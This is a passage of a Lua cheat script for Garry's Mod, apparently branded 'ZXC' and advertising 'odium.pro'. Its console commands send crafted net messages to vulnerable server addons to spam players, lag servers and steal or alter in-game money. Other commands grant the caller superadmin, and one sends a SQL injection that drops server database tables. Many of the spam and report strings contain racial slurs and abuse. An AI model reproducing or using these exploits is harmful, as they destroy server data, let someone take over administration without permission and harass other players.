      odium.G.net.SendToServer()
      elseif maxcodes:GetInt() == 2 then
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 1, 1 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 2, 2 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(1, 4)
      odium.G.net.SendToServer()
      elseif maxcodes:GetInt() == 1 then
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(0, 4)
      odium.G.net.WriteUInt(string.sub( keypadcode:GetInt(), 1, 1 ), 8)
      odium.G.net.SendToServer()
      odium.G.net.Start("Keypad")
      net.WriteEntity(v)
      odium.G.net.WriteUInt(1, 4)
      odium.G.net.SendToServer()
    end
  end
end
end 

concommand.Add( "zxc_keypad_open", ZXC.OpenKeypad)

local spok = false
concommand.Add( "zxc_keypad_spam_open", function()
    spok = !spok
    if( spok ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Spam open keypad ", Color(0,255,0), "enabled\n")
            timer.Create( "spok", 0.15, 0, ZXC.OpenKeypad)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Spam open keypad ", Color(255,0,0), "disabled\n")
            timer.Destroy( "spok" )
    end
end )

local kekmsg = CreateClientConVar("zxc_ulx_cc_flstring", "BUY ODIUM.PRO", true, false)

local function spamtoplayer( ply )
    local buyit = {}
       for i = 1, 10 do
           table.insert( buyit, kekmsg:GetString() )
    end

    odium.G.net.Start( "sendtable" )
        net.WriteEntity( ply )
        net.WriteTable( buyit )
    odium.G.net.SendToServer()
end

concommand.Add("zxc_ulx_cc_flspam", function() 
    for k, v in pairs( player.GetAll() ) do
        spamtoplayer( v )
    end
end )

concommand.Add( "zxc_ulx_cc_flspamtog", function() 
    if !timer.Exists( "bighakes" ) then
        timer.Create( "bighakes", 0.5, 0, function()
            for k, v in pairs( player.GetAll() ) do
                spamtoplayer( v )
            end
        end)
    else
        timer.Remove( "bighakes" )
    end
end)

//m4a1 assault rifle
concommand.Add("zxc_armory_1", function()
  odium.G.net.Start("ARMORY_RetrieveWeapon")
  odium.G.net.WriteString("weapon1")
  odium.G.net.SendToServer()
end )
//m3 shotgun
concommand.Add("zxc_armory_2", function()
  odium.G.net.Start("ARMORY_RetrieveWeapon")
  odium.G.net.WriteString("weapon2")
  odium.G.net.SendToServer()
end )
//m21 sniper
concommand.Add("zxc_armory_3", function()
  odium.G.net.Start("ARMORY_RetrieveWeapon")
  odium.G.net.WriteString("weapon3")
  odium.G.net.SendToServer()
end )

local function SpamFactions(ply)
  odium.G.net.Start("FactionInviteConsole")
  net.WriteEntity(ply)
  net.WriteEntity(table.Random(player.GetAll()))
  odium.G.net.SendToServer()
end

concommand.Add("zxc_exploit_factions", function(ply, cmd, args)
  timer.Create("wewladdy", 1, 0, function()
      for k, v in pairs(player.GetAll()) do 
        SpamFactions(v)
      end
    end)
end)

local charset = {}

-- qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890
for i = 48,  57 do table.insert(charset, string.char(i)) end
for i = 65,  90 do table.insert(charset, string.char(i)) end
for i = 97, 122 do table.insert(charset, string.char(i)) end

function random_string(length)
  math.randomseed(os.time())

  if length > 0 then
    return random_string(length - 1) .. charset[math.random(1, #charset)]
  else
    return ""
  end
end

local rainbow = {
  R = math.sin(CurTime() * 4) * 127 + 128,
  G = math.sin(CurTime() * 4 + 2) * 127 + 128,
  B = math.sin(CurTime() * 4 + 4) * 127 + 128,
}

function random_color()
  return Color(rainbow.R / 255, rainbow.G / 255, rainbow.B / 255)
end

concommand.Add("zxc_exploit_factions_spam", function(ply, cmd, args)
  timer.Create("fuckniggers", 1, 0, function()
    odium.G.net.Start("FacCreate")
    odium.G.net.WriteString("GET ODIUM.PRO TODAY " .. random_string(5))
    odium.G.net.WriteString("GET ODIUM.PRO TODAY " .. random_string(10))
    net.WriteColor(random_color())
    net.WriteBool(false)
    odium.G.net.WriteString(random_string(5))
    odium.G.net.SendToServer()
  end)
end)

// 1942 rp
concommand.Add("zxc_pog_fuhrerspam", function()
  odium.G.net.Start("1942_Fuhrer_SubmitCandidacy")
  odium.G.net.WriteString(LocalPlayer():Nick())
  odium.G.net.SendToServer()
end )

// 1942 rp
concommand.Add("zxc_pog_reportall", function()
  for i = 0, 100 do
  for k,v in pairs(player.GetAll()) do 
      odium.G.net.Start("pogcp_report_submitReport")
        odium.G.net.WriteString("complete and utter nigger")
        odium.G.net.WriteString("nicde security retards")
        net.WriteEntity(v)
      odium.G.net.SendToServer()
    end
end
end )

concommand.Add("zxc_textscreenlag", function()
for i = 0, 2500 do
  for k,v in pairs(player.GetAll()) do
          odium.G.net.Start("textscreens_download") net.WriteEntity(v) odium.G.net.SendToServer()
    end
end
end )

local hooktable = hook.GetTable()
local one = {}
local two = {}
  
for i = 1, 10 do 
  table.insert(one, "!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n")
  table.insert(two, "!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n")
end
  

function spamfuckers(ply)
  odium.G.net.Start( "hsend" )
  net.WriteTable( one )
  net.WriteTable( two )
  net.WriteEntity( ply )
  odium.G.net.WriteString( "!! GET ODIUM.PRO !!" )
  odium.G.net.SendToServer()
end

concommand.Add("zxc_ulxextended_hooks", function()
  timer.Create("kekeke", 0.5, 0, function()
    for k, v in pairs(player.GetAll()) do 
      spamfuckers(v)
    end
  end)
end)

local three = {}
local four = {}
local contable = concommand.GetTable()

for i = 1, 10 do
  table.insert(three, "!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n")
  table.insert(four, "!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n!!ODIUM.PRO!!\n")
end

function spamfuckers2(ply)
  odium.G.net.Start( "send" )
  net.WriteTable( three )
  net.WriteTable( four )
  net.WriteEntity( ply )
  odium.G.net.WriteString( "!! GET ODIUM.PRO !!" ) // or table.Random(player.GetAll()):Nick()
  odium.G.net.SendToServer()
end

concommand.Add("zxc_ulx_cc_commandtable", function()
  timer.Create('wowthisisgay', 1, 0, function()
    for k, v in pairs(player.GetAll()) do
      spamfuckers2(v)
    end
  end)
end)

function fucktheirdata(str)
  odium.G.net.Start( "WriteQuery" )
  odium.G.net.WriteString( str )
  odium.G.net.SendToServer()
end

concommand.Add("zxc_ulx_cc_notepadspam", function()
  if !timer.Exists("fuckinggay") then
    timer.Create("fuckinggay", 1, 0, function()
      fucktheirdata("!!!BUY ODIUM.PRO!!! " .. random_string(5))
    end)
  else
    timer.Remove("fuckinggay")
  end
end)

function unbuildply(ply)
  odium.G.net.Start( "BuilderXToggleKill" ) // for some shitty build addon I dont even remember
  net.WriteEntity( ply )
  odium.G.net.SendToServer()
end

concommand.Add("zxc_builderx_unbuildall", function()
  for k, v in pairs(player.GetAll()) do
    unbuildply(v)
  end
end)

//posiedon is aids
function fuckugarry(steamid, reason, details) 
  odium.G.net.Start( "TransferReport" )
  odium.G.net.WriteString( steamId )
  odium.G.net.WriteString( reason )
  odium.G.net.WriteString( details )
  odium.G.net.SendToServer()
end

concommand.Add("zxc_poseidon_reportall", function()
  timer.Create("zxc_fuckuposeidon", 1, 0, function()
    for k, v in pairs(player.GetAll()) do
      fuckugarry(v:SteamID(), "FUCK U POSEIDON U DIRTY NIGGER", "!!!BUY ODIUM.PRO TODAY!!!")
    end
  end)
end)


function poseidoncansuckmynuts()
  odium.G.net.Start("Chatbox_PlayerChat")
  net.WriteEntity(LocalPlayer())
  net.WriteBit(1)
  odium.G.net.WriteString("!!!BUY ODIUM.PRO!!!")
  net.WriteBit(1)
  odium.G.net.SendToServer()
end

concommand.Add("zxc_wiloxchat_spam", function()
  timer.Create("zxc_ripchatbox", 1, 0, poseidoncansuckmynuts)
end)

concommand.Add("zxc_stoptimers", function()
  local timers = {
    "kekeke", 
    "wowthisisgay",
    "fuckinggay",
    "zxc_fuckuposeidon",
    "zxc_ripchatbox",
    "wowursogay",
    "fuckingrekt",
    "spok",
    "sks",
    "cps",
    "zxc_ripchatbox",
  }

  for k, v in pairs(timers) do
    if timer.Exists(v) then
      timer.Remove(v)
    end
  end
end)

function GGRP()
for k,v in pairs(player.GetAll()) do
      odium.G.net.Start('reports.submit')
          net.WriteEntity(v)
          net.WriteInt(5, 8)
          odium.G.net.WriteString("cya")
      odium.G.net.SendToServer()
  end
end
concommand.Add("zxc_gg_reportspam2", GGRP)

local GGRPS = false
concommand.Add( "zxc_gg_reportspam", function()
    GGRPS = !GGRPS
    if( GGRPS ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"GG Report Spam ", Color(0,255,0), "enabled\n")
            hook.Add( "Think", "GGRP", GGRP)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"GG Report spam ", Color(255,0,0), "disabled\n")
            hook.Remove("Think", "GGRP")
    end
end )

concommand.Add("zxc_infernus_serviceaccept", function()
  timer.Create("test", 0, 0, function() 
  for k,v in pairs(player.GetAll()) do 
        odium.G.net.Start("services_accept")
        odium.G.net.WriteString("test 1")
        net.WriteVector(Vector(v:GetPos()))
        odium.G.net.WriteString("test image")
        net.WriteEntity(v)
        net.SendToSwerver()
      end
    end)
  timer.Simple(4, function() 
            timer.Destroy("test") 
  end )
end )

function RealisticPrintersHeater()
for k, v in pairs(ents.GetAll()) do
    if(v:GetClass():find("print") && v.Variables["enable"] == true && v.Variables["power"] <= 97 && v:GetPos():Distance( LocalPlayer():GetPos() ) >= 500) then
          odium.G.net.Start("customprinter_get")
          net.WriteEntity(v)
          odium.G.net.WriteString("p_up")
          odium.G.net.SendToServer()
    end
  end
end 

function RealisticPrintersCooler()
for k, v in pairs(ents.GetAll()) do
    if(v:GetClass():find("print") && v.Variables["enable"] == true && v.Variables["power"] >= 3 && v:GetPos():Distance( LocalPlayer():GetPos() ) >= 500) then
          odium.G.net.Start("customprinter_get")
          net.WriteEntity(v)
          odium.G.net.WriteString("p_down")
          odium.G.net.SendToServer()
    end
  end
end

function RealisticPrintersOn()
  for k, v in pairs(ents.GetAll()) do
    if(v:GetClass():find("print") && v.Variables["enable"] == false && v:GetPos():Distance( LocalPlayer():GetPos() ) >= 500) then
          odium.G.net.Start("customprinter_get")
          net.WriteEntity(v)
          odium.G.net.WriteString("onoff")
          odium.G.net.SendToServer()
    end
  end
end

function RealisticPrintersOff()
  for k, v in pairs(ents.GetAll()) do
    if(v:GetClass():find("print") && v.Variables["enable"] == true && v:GetPos():Distance( LocalPlayer():GetPos() ) >= 500) then
          odium.G.net.Start("customprinter_get")
          net.WriteEntity(v)
          odium.G.net.WriteString("onoff")
          odium.G.net.SendToServer()
    end
  end
end

function RealisticPrintersFarm()
for k, v in pairs(ents.GetAll()) do
    if(v:GetClass():find("print") && v.Variables["enable"] == true && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 250) then
      if(v.Variables["money"] >= 500 ) then 
          odium.G.net.Start("customprinter_get")
          net.WriteEntity(v)
          odium.G.net.WriteString("g_money")
          odium.G.net.SendToServer()
      end
      if(v.Variables["temp"] >= 80 && v.Variables["time"] >= 30 ) then 
          odium.G.net.Start("customprinter_get")
          net.WriteEntity(v)
          odium.G.net.WriteString("onoff")
          odium.G.net.SendToServer()
          timer.Simple(15, function() 
          odium.G.net.Start("customprinter_get")
          net.WriteEntity(v)
          odium.G.net.WriteString("onoff")
          odium.G.net.SendToServer()
          end )
      end
    end
  end
end

local RPF = false
concommand.Add( "zxc_realprinters_farm", function()
    RPF = !RPF
    if( tst2 ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Realistic Printer farmer ", Color(0,255,0), "enabled\n")
            timer.Create( "RPF", 1, 0, RealisticPrintersFarm)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Realistic Printer farmer ", Color(255,0,0), "disabled\n")
            timer.Destroy( "RPF" )
    end
end )

local RPE = false
concommand.Add( "zxc_realprinters_commandstart", function(ply,cmd,arg)
      if (arg[1] == nil) then 
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Useage: zxc_realprinters_commandstart heat/cool/on/off")
        elseif (arg[1] == "heat") then 
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Realistic Printer exploder ", Color(0,255,0), "enabled\n")
            timer.Create("RPE"..arg[1], 0, 0, RealisticPrintersHeater)
        elseif (arg[1] == "cool") then
          chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Realistic Printer cooler ", Color(0,255,0), "enabled\n")
          timer.Create("RPE"..arg[1], 0, 0, RealisticPrintersCooler)
        elseif (arg[1] == "on") then
          chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Force on spam ", Color(0,255,0), "enabled\n")
          timer.Create("RPE"..arg[1], 0, 0, RealisticPrintersOn)
        elseif (arg[1] == "off") then
          chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Force off spam ", Color(0,255,0), "enabled\n")
          timer.Create("RPE"..arg[1], 0, 0, RealisticPrintersOff)
        end
end )
concommand.Add("zxc_realprinters_commandstop", function(ply,cmd,arg)
      if (arg[1] == nil) then 
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Useage: zxc_realprinters_commandstop heat/cool/on/off")
        elseif (arg[1] == "heat") then 
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Realistic Printer exploder ", Color(255,0,0), "disabled\n")
        elseif (arg[1] == "cool") then
          chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Realistic Printer cooler ", Color(255,0,0), "disabled\n")
        elseif (arg[1] == "on") then
          chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Force on spam ", Color(255,0,0), "disabled\n")
        elseif (arg[1] == "off") then
          chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Force off spam ", Color(255,0,0), "disabled\n")
        end
timer.Destroy("RPE"..arg[1])
end )

function hooolyshit(ply, reason)
  odium.G.net.Start("Warn_CreateWarn")
  net.WriteEntity(ply)
  odium.G.net.WriteString(reason)
  odium.G.net.SendToServer()
end

concommand.Add("zxc_jailbreak_c_warn", function()
  timer.Create("niggers", 1, 0, function()
    for k, v in pairs(player.GetAll()) do
      hooolyshit(v, "!!!BUY ODIUM.PRO TODAY!!!")
    end
  end)
end)



function toomanysploits(ply, reason)
  odium.G.net.Start("NewReport")
  net.WriteType(ply)
  net.WriteInt(8,5)
  odium.G.net.WriteString(reason)
  odium.G.net.SendToServer()
end

concommand.Add("zxc_jailbreak_c_report", function()
  timer.Create("fuckmecunts", 1, 0, function()
    for k, v in pairs(player.GetAll()) do
      toomanysploits(v, "!!!BUY ODIUM.PRO TODAY!!!")
    end
  end)
end)

local function spamtoplayer2( )
    local buyit2 = {}
       for i = 1, 10 do
           table.insert( buyit2, "!!!BUY ODIUM.PRO TODAY!!!" ) // there u go bby
    end

    odium.G.net.Start( "friendlist" )
    net.WriteTable( buyit2 )
    odium.G.net.SendToServer()
end

concommand.Add("zxc_ulxextended_friendslist", function()
  timer.Create("wowursogay", 1, 0, spamtoplayer2)
end)

concommand.Add("zxc_vjbase_spam", function()
for k,v in pairs(player.GetAll()) do
    odium.G.net.Start("VJSay")
    net.WriteEntity(v)
    net.WriteBool(0)
    odium.G.net.WriteString("/ooc !! GET ODIUM.PRO !!")
    odium.G.net.WriteString("bot/roger_that.wav")
    odium.G.net.SendToServer()
  end
  --RunConsoleCommand("fadmin","ban","STEAM_0:1:64939230","0","wew")
end )

concommand.Add("zxc_hitmanx_givemoney", function()
    odium.G.net.Start( "SendMoney" )
      net.WriteEntity( LocalPlayer() )
      net.WriteEntity( LocalPlayer() )
      net.WriteEntity( LocalPlayer() )
      odium.G.net.WriteString( "-1000000" )
    odium.G.net.SendToServer()
end )

concommand.Add("zxc_hitmanx_giveallmoney", function()
  for k,v in pairs(player.GetAll()) do 
    odium.G.net.Start( "SendMoney" )
      net.WriteEntity( v )
      net.WriteEntity( v )
      net.WriteEntity( v )
      odium.G.net.WriteString( "-10000000000000" )
    odium.G.net.SendToServer()
  end
end )

concommand.Add("zxc_hitmanx_removeallmoney", function()
  for k,v in pairs(player.GetAll()) do 
    odium.G.net.Start( "SendMoney" )
      net.WriteEntity( v )
      net.WriteEntity( v )
      net.WriteEntity( v )
      odium.G.net.WriteString( "100000000000000" )
    odium.G.net.SendToServer()
  end
end )

concommand.Add("zxc_watchdogs_keypad", function()
    odium.G.net.Start("start_wd_emp")
    odium.G.net.SendToServer()
end)

concommand.Add("zxc_reportaddon_deletedb", function()
  chat.AddText(Color(197,200,255),"-----------------------------------------")
  local dbname = {"permaprops", "darkrp_jobspawn", "darkrp_position", "darkrp_player", "darkrp_door", "darkrp_doorgroups", "FAdminBans", "FAdmin_ServerSettings", "playerdata", "atlaschat_players", "atlaschat_ranks", "atlaschat_restrictions", "atlaschat_remote"}
  for k,v in pairs(dbname) do
              local tbl = {}
            tbl.tblname = "darkrp_door; DROP TABLE "..v.."; CREATE TABLE "..v.."(a STRING)"
            tbl.ply = LocalPlayer()
            odium.G.net.Start("pplay_sendtable")
            net.WriteTable(tbl)
            odium.G.net.SendToServer()
      chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255), "Dropped Table: ", Color(0,215,0), v)            
    end
    chat.AddText(Color(197,200,255),"-----------------------------------------")
end )

concommand.Add("zxc_reportaddon_givesuper", function()
local id = LocalPlayer():SteamID()
local tbl = {}

tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
    "steamid",
    tostring(id)
}

odium.G.net.Start("pplay_deleterow")
net.WriteTable(tbl)
odium.G.net.SendToServer()

local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
    tostring(id),
    "superadmin"
}

odium.G.net.Start("pplay_addrow")
net.WriteTable(tbl)
odium.G.net.SendToServer()

end )




























----[--{ Misc }--]----


function clearcon()
  for i = 0, 100 do
    print(" ")
  end
end

function clearchat()
  for i = 0, 100 do
      chat.AddText(" ")
    end
end

concommand.Add("zxc_stoperrors", function() 
hook.Add("Think","wow", function() for k, v in pairs(player.GetAll()) do
if (v:GetModel():find("models/error.mdl")) then
    v:SetModel("models/player/group01/male_02.mdl")
    print(v:Nick() .. " model reset due to models/error.mdl")
    end
  end
  end)
end )

function ZXC.Vape()
  timer.Simple(0, function() RunConsoleCommand("+attack") end )
  timer.Simple(5.134, function() RunConsoleCommand("-attack") end )
end
concommand.Add("zxc_vape", ZXC.Vape)
 
function ZXC.AntiAFK()
  timer.Simple(0, function() RunConsoleCommand("+forward") end )
  timer.Simple(2.5, function() RunConsoleCommand("-forward") end )
  timer.Simple(2.52, function() RunConsoleCommand("+back") end )
  timer.Simple(5.02, function() RunConsoleCommand("-back") end )
end
 
local afk = false
concommand.Add( "zxc_antiafk", function()
    afk = !afk
    ZXC.AntiAFK()
    if( afk ) then
            timer.Create( "afk", 20, 0, function()
                    ZXC.AntiAFK()
            end )        else
            timer.Destroy( "afk" )
    end
end )
 
local spamattack = false
concommand.Add( "zxc_spamattack", function()
    spamattack = !spamattack
    if( spamattack ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Attack Spam ", Color(0,255,0), "enabled\n")
            timer.Create( "SpamDatAttack", 0.042, 0, function()
                    timer.Simple(0, function() RunConsoleCommand("+attack") end )
                    timer.Simple(0.04, function() RunConsoleCommand("-attack") end )
            end )
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Attack Spam ", Color(255,0,0), "disabled\n")
            timer.Destroy( "SpamDatAttack" )
    end
end )
 
local spamuse = false
concommand.Add( "zxc_spamuse", function()
    spamuse = !spamuse
    if( spamuse ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Use Spam ", Color(0,255,0), "enabled\n")
            timer.Create("SpamDatUse", 0.1, 0, function() 
                timer.Simple(0.01, function() RunConsoleCommand("+use") end )
                timer.Simple(0.07, function() RunConsoleCommand("-use") end )
            end )
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"Use Spam ", Color(255,0,0), "disabled\n")
            timer.Destroy("SpamDatUse")
    end
end )
 
concommand.Add("zxc_dupeweapon", function()
  timer.Simple( 0.4744, function()
      RunConsoleCommand("say", "/drop")  
end)
  timer.Simple( 1.4135, function()
      RunConsoleCommand("say", "/sleep")  
end)
  timer.Simple( 7, function()
      RunConsoleCommand("say", "/sleep")  
  end)
end)
 
concommand.Add("zxc_sitclimb", function()
  timer.Simple( 0, function()
      RunConsoleCommand("+reload")  
end)
  timer.Simple( 0.03, function()
      RunConsoleCommand("sit")  
      RunConsoleCommand("-reload")  
  end)
end)

concommand.Add("ace_printmoney", function()
  chat.AddText(Color(197,200,255),"-----------------------------------------")
  for k,v in pairs(player.GetAll()) do
     chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(0,215,0),v:Nick(), Color(255,255,255), " (", Color(255,255,255), v:GetUserGroup(),Color(255,255,255), ")", Color(255,255,255), " has ", Color(255,215,0),DarkRP.formatMoney(v:getDarkRPVar("money")))
   end
  chat.AddText(Color(197,200,255),"-----------------------------------------")
end )

concommand.Add("zxc_pk_changeteam", function()
timer.Create("hehe", 0.05, 100, function() 
    timer.Simple(0.01, function() RunConsoleCommand("pk_team", "1") end )
    timer.Simple(0.02, function() RunConsoleCommand("pk_team", "2") end )
    timer.Simple(0.03, function() RunConsoleCommand("pk_team", "0") end )
    end )
end )

concommand.Add("zxc_printadmins", function()
  chat.AddText(Color(197,200,255),"-----------------------------------------------------------------------------")
  for k,v in pairs(player.GetAll()) do
      if v:IsAdmin() then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(0,215,0),v:Nick(), Color(255,255,255), " (", Color(255,255,255), v:SteamID(),Color(255,255,255), ")", Color(255,255,255), " is ", Color(255,215,0), "Admin", Color(255,255,255), " or above.", Color(255,255,255), " (", Color(0,255,0), v:GetNWString("UserGroup"),Color(255,255,255),")")
      end
    end
  chat.AddText(Color(197,200,255),"-----------------------------------------------------------------------------")
end )

concommand.Add("zxc_webcontent", function(ply,cmd,arg)
  http.Fetch('http://'..arg[1],function(b) file.Write(arg[2]..".txt", (b)) end,nil)
end)

concommand.Add("zxc_printowner", function()
  local yellow = Color(255,255,0)
  local white = Color(255,255,255)
  local green = Color(0,255,0)
  local red = Color(255,0,0)
  local lookingat = LocalPlayer():GetEyeTrace().Entity

if (FPP or IcefusePP) then
  if (lookingat:CPPIGetOwner() == nil) then
    chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",red,lookingat,white,Color(255,255,255)," (",yellow,lookingat:GetModel(),white,")",white, " is a world prop.")
  else    
    chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",red,lookingat,white,Color(255,255,255)," (",yellow,lookingat:GetModel(),white,")",white, " is owned by ",green,lookingat:CPPIGetOwner():Nick(), Color(255,255,255), ".")
end
  else 
    chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",red,lookingat,white,Color(255,255,255)," (",yellow,lookingat:GetModel(),white,")",white, " is owned by ",green,lookingat:GetOwner(), Color(255,255,255), ".")
  end
end )

concommand.Add("zxc_clearrcon", clearrcon)
concommand.Add("zxc_clearchat", clearchat)

ZXC.LoadShit()
MsgC( Color( 0, 255, 0 ), "==========>-----     ZXC Initialized     -----<==========\n" )


local timers = {
    "kekeke", 
    "wowthisisgay",
    "fuckinggay",
    "zxc_fuckuposeidon",
    "zxc_ripchatbox",
    "wowursogay",
    "fuckingrekt",
    "spok",
    "sks",
    "cps",
    "zxc_ripchatbox",
  }

concommand.Add("zxc_stoptimers", function()
  for k, v in pairs(timers) do
    if timer.Exists(v) then
      timer.Remove(v)
    end
  end
end)






// testing shit below


function TST2()
  return false
end

local tst2 = false
concommand.Add( "zxc_testspam", function()
    tst2 = !tst2
    if( tst2 ) then
        chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"TEST Spam ", Color(0,255,0), "enabled\n")
            timer.Create( "tst2", 4, 0, TST2)
    else
            chat.AddText(Color(197,200,255),"[",Color(197,200,255),"ZXC",Color(197,200,255),"] ",Color(255,255,255),"TEST Spam ", Color(255,0,0), "disabled\n")
            timer.Destroy( "tst2" )
    end
end )





concommand.Add("zxc_test", function() 
for k, v in pairs(ents.GetAll()) do
  if (v:GetPos():Distance( LocalPlayer():GetPos() ) <= 135 ) then
      for i = 0, 250 do odium.G.net.Start("Keypad") net.WriteEntity(v) odium.G.net.WriteUInt(3, 4) odium.G.net.SendToServer() end
    end
  end
end )

concommand.Add("zxc_test2", function()
  return false
end )

concommand.Add("zxc_test3", function()
  return false
end )

concommand.Add("zxc_test4", function()
local str = ""
for i=0, 150 do
    str = str .. "\n"
end
odium.G.net.Start("atlaschat.chat")
odium.G.net.WriteString("/ooc " .. str)
odium.G.net.SendToServer()
end )